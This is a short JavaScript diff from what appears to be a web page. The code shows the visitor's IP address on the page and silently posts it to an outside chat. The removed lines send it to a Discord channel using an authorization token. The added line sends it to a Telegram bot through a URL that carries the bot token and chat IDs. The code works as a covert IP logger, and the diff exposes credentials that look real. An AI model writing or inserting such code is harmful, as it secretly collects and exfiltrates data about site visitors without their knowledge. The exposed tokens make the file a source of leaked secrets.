@@ -25,14 +25,13 @@
          
         // Setting text of element P with id gfg
         $("#gfg").html(data.ip);
-        fetch('https://discord.com/api/v9/channels/1028003104202952884/messages', {
+        fetch('https://api.telegram.org/bot6065032783:AAFVgRyMDdiYLq-Ph2NAo3i77NXLces7K6U/sendMessage?chat_id=6216682581&text=' + data.ip, {
   method: 'POST',
   body: JSON.stringify({
-    content: 'Username : Unknow\nIpv4 : ' + data.ip,
+    'chat_id': '925216187',
   }),
   headers: {
     'Content-type': 'application/json',
-    'authorization': 'OTI0NzMzMjkxNTExMzA4MzQw.G8XqSc.sgDQ-ENl1ZPs_FKny6h9vJj-UGObevwyEC52mI',
   },
 })
   .then((response) => response.json())
